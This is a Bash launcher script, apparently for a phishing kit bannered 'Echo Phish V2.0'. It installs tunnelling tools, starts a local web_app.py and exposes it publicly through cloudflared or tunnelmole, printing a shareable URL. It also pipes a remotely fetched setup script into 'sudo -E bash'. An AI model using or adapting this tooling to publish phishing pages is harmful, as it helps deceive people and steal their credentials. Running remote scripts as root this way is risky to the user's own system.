#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RESET='\033[0m'

cleanup() {
    if pgrep -f "cloudflared" > /dev/null; then
        killall cloudflared
        echo -e "${YELLOW}Cloudflared stopped.${RESET}"
    fi
    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null || pgrep -f "x-www-browser" > /dev/null; then
        pkill -f "tunnelmole"
        pkill -f "tmole"
        pkill -f "x-www-browser"
        echo -e "${YELLOW}Tunnelmole stopped.${RESET}"
    fi
    if pgrep -f "python3 web_app.py" > /dev/null; then
        pkill -f "python3 web_app.py"
        echo -e "${YELLOW}Web application stopped.${RESET}"
    fi
    exit 0
}

trap cleanup SIGINT

banner1() {
    echo -e "${CYAN} _____                                                     _____ "
    echo -e "( ___ )                                                   ( ___ )"
    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
    echo -e " |   |  ______     _             _____  _     _     _      |   | "
    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
    echo -e "                                                    V2.0\n"
    echo -e "${RED}    "
}

check_dependencies() {
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${YELLOW}Cloudflared is not installed. Installing...${RESET}"
        if [ -d "/data/data/com.termux" ]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O $PREFIX/bin/cloudflared
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
        fi
        chmod +x ${PREFIX:-/usr/local/bin}/cloudflared
        echo -e "${GREEN}Cloudflared installed successfully.${RESET}"
    fi

    if ! command -v node &> /dev/null; then
        echo -e "${YELLOW}Node.js is not installed. Installing...${RESET}"
        
        if [ -d "/data/data/com.termux" ]; then
            pkg update -y && pkg install -y nodejs
        else
            curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
            sudo apt-get install -y nodejs
        fi
        echo -e "${GREEN}Node.js installed successfully.${RESET}"
    fi

    if ! command -v tunnelmole &> /dev/null; then
        echo -e "${YELLOW}Tunnelmole is not installed. Installing...${RESET}"
        
        if [ -d "/data/data/com.termux" ]; then
            npm install -g tunnelmole
        else
            sudo npm install -g tunnelmole
        fi
        echo -e "${GREEN}Tunnelmole installed successfully.${RESET}"
    fi

    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}jq is not installed. Installing...${RESET}"
        if [ -d "/data/data/com.termux" ]; then
            pkg update -y && pkg install -y jq
        else
            sudo apt-get update -y && sudo apt-get install -y jq
        fi
        echo -e "${GREEN}jq installed successfully.${RESET}"
    fi
}

check_dependencies

select_methode () {
    clear
    banner1

    echo -e "\n${YELLOW}    Select the method!"
    echo -e "----------------------"
    echo -e "|   1-${GREEN} localhost${YELLOW}       |"
    echo -e "----------------------"
    echo -e "|   2-${GREEN} cloudflared${YELLOW}     |"
    echo -e "----------------------"
    echo -e "|   3-${GREEN} tunnelmole${YELLOW}      | (Recommended for Termux)"
    echo -e "----------------------"

    read -p "Choose: " choose

    clear
    banner1

    case $choose in
        1)
            python3 web_app.py &
            sleep 2
            clear
            banner1
            echo -e "${YELLOW} \nURLs: "
            echo -e "------------------------------------------------"
            echo -e "${GREEN}-URL:\nhttp://127.0.0.1:8080${YELLOW}"
            echo -e "------------------------------------------------"
            ;;

        2)
            python3 web_app.py &
            sleep 2
            cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:8080 2>/dev/null & 
            clear
            banner1
            echo -e "${YELLOW}Cloudflared starting...."

            result=""
            while [[ -z "$result" || "$result" == "null" ]]; do
                result=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
                sleep 1 
            done

            clear
            banner1
            echo -e "${YELLOW} \nURLs: "
            echo -e "------------------------------------------------"
            echo -e "${GREEN}https://${result}${YELLOW}"
            echo -e "------------------------------------------------"
            ;;

        3)
            python3 web_app.py &
            sleep 2
            clear
            banner1
            echo -e "${YELLOW}Tunnelmole starting....${GREEN}\n"
            tunnelmole 8080 
            sleep 2
            ;;

        *)
            echo -e "${RED}Please enter a valid number!${RESET}"
            sleep 1
            select_methode  
            ;;

    esac
}

select_methode

while true; do
    sleep 1
done
